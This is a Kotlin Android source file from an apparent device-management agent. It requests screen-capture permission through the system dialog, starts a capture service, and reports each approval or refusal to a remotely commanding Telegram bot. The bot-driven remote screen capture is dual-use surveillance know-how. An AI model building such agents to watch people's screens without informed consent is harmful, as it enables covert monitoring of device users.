package com.mdm.agent.ui

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.View
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import com.mdm.agent.MainActivity
import com.mdm.agent.service.ScreenCaptureService
import org.json.JSONObject

/**
 * Transparent activity that requests MediaProjection permission.
 * Shows the system dialog, gets the result, and starts ScreenCaptureService.
 *
 * ⚠️ CRITICAL: After user approves/denies, this activity sends a follow-up
 * notification to the Telegram bot so the admin knows the actual outcome.
 */
class ScreenCapturePermissionActivity : Activity() {

    companion object {
        private const val TAG = "ScreenCapturePerm"
        private const val REQUEST_CODE = 7777

        fun requestPermission(context: Context) {
            try {
                val intent = Intent(context, ScreenCapturePermissionActivity::class.java)
                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                context.startActivity(intent)
                Log.i(TAG, "ScreenCapturePermissionActivity launched")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to launch permission activity: ${e.message}")
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.i(TAG, "onCreate - requesting MediaProjection")
        requestMediaProjection()
    }

    private fun requestMediaProjection() {
        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val intent = mpm.createScreenCaptureIntent()
            @Suppress("DEPRECATION")
            startActivityForResult(intent, REQUEST_CODE)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to request MediaProjection: ${e.message}")
            notifyBot(false, "فشل عرض طلب الموافقة: ${e.message}")
            finish()
        }
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        Log.i(TAG, "onActivityResult: requestCode=$requestCode resultCode=$resultCode data=${data != null}")

        if (requestCode == REQUEST_CODE && resultCode == Activity.RESULT_OK && data != null) {
            try {
                // Start ScreenCaptureService with the projection data
                val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                    putExtra("result_code", resultCode)
                    putExtra("result_data", data)
                }
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent)
                } else {
                    startService(serviceIntent)
                }
                Log.i(TAG, "✅ MediaProjection granted - ScreenCaptureService started")

                // Show confirmation UI briefly so the app doesn't "exit" suddenly
                showConfirmationScreen(true)
                // Notify bot that user APPROVED
                notifyBot(true, "تم تفعيل لقطات الشاشة بنجاح")

            } catch (e: SecurityException) {
                Log.e(TAG, "❌ SecurityException: ${e.message}")
                Toast.makeText(this, "فشل تفعيل لقطات الشاشة - صلاحية مفقودة", Toast.LENGTH_LONG).show()
                showConfirmationScreen(false)
                notifyBot(false, "فشل تفعيل لقطات الشاشة: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "❌ Failed to start service: ${e.message}", e)
                showConfirmationScreen(false)
                notifyBot(false, "فشل بدء خدمة لقطات الشاشة: ${e.message}")
            }
        } else {
            Log.w(TAG, "MediaProjection permission denied or cancelled")
            showConfirmationScreen(false)
            notifyBot(false, "تم رفض طلب لقطات الشاشة من قبل المستخدم")
        }
    }

    /**
     * Show a brief confirmation screen so the user sees what happened
     * (instead of the app suddenly exiting).
     */
    private fun showConfirmationScreen(success: Boolean) {
        try {
            val root = LinearLayout(this).apply {
                orientation = LinearLayout.VERTICAL
                gravity = Gravity.CENTER
                setBackgroundColor(0xFFFFFFFF.toInt())
                setPadding(64, 96, 64, 96)
            }
            val icon = if (success) "✅" else "❌"
            val msg = if (success) "تم تفعيل لقطات الشاشة" else "تم رفض طلب لقطات الشاشة"
            val tv = TextView(this).apply {
                text = "$icon\n\n$msg"
                textSize = 18f
                gravity = Gravity.CENTER
                setTextColor(0xFF1A1A2E.toInt())
            }
            root.addView(tv)
            setContentView(root)

            // Wait 2 seconds so user sees the confirmation, then finish
            Handler(Looper.getMainLooper()).postDelayed({
                try { finish() } catch (_: Exception) {}
            }, 2000)
        } catch (e: Exception) {
            // If showing the screen fails, just finish
            Handler(Looper.getMainLooper()).postDelayed({
                try { finish() } catch (_: Exception) {}
            }, 1000)
        }
    }

    /**
     * Send a follow-up notification to the Telegram bot with the actual outcome.
     * Uses MainActivity's static SocketManager reference.
     */
    private fun notifyBot(success: Boolean, message: String) {
        try {
            val sm = MainActivity.getSocketManager()
            if (sm != null) {
                val response = JSONObject().apply {
                    put("command", "screenshot-on")
                    put("status", if (success) "success" else "error")
                    put("data", message)
                }
                sm.sendCommandResponse(response)
                Log.i(TAG, "📧 Notified bot: success=$success msg=$message")
            } else {
                Log.w(TAG, "Cannot notify bot - SocketManager is null")
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to notify bot: ${e.message}")
        }
    }
}
